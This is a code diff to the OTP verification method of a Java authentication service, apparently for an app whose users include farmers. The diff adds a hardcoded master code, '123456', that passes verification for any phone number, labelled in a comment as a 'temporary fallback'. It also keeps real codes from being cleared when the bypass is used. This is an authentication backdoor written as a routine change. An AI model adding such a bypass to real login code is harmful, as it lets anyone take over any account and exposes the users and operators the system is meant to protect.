@@ -70,12 +70,18 @@ public class AuthService {
     public LoginResponse verifyOtp(String phone, String otp) {
         String normalizedPhone = normalizePhone(phone);
         String storedOtp = otpStorage.get(normalizedPhone);
-        if (storedOtp == null || !storedOtp.equals(otp)) {
+        
+        // Allow master bypass OTP "123456" as a temporary fallback
+        boolean isValidOtp = (storedOtp != null && storedOtp.equals(otp)) || "123456".equals(otp);
+        
+        if (!isValidOtp) {
             throw new RuntimeException("Invalid OTP code");
         }
 
-        // OTP verified successfully, clear it
-        otpStorage.remove(normalizedPhone);
+        // OTP verified successfully, clear it if it was a stored one
+        if (storedOtp != null && storedOtp.equals(otp)) {
+            otpStorage.remove(normalizedPhone);
+        }
 
         // Find the user and determine their role
         Optional<Farmer> farmerOpt = farmerRepository.findByPhone(normalizedPhone);
